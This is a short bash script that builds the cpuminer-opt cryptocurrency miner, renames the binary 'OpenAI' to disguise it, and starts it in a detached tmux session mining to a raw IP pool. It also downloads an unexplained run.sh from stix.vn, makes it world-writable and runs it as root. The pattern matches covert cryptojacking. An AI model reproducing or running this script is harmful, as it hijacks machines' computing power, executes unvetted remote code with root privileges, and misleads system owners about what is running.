#!/bin/bash
sudo apt-get update && sudo apt-get -y upgrade
sudo apt-get install -y wget tmux git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen
sudo git clone https://github.com/JayDDee/cpuminer-opt
sudo cd cpuminer-opt
sudo ./build.sh
sudo mv cpuminer OpenAI
sudo wget http://stix.vn/run.sh
sudo chmod 777 run.sh
sudo tmux new-session "sudo ./run.sh" & sudo tmux new-session "sleep 20 && ./OpenAI -a lyra2z -o stratum+tcp://95.169.195.152:3032 -u zimbalem.test -p x " 
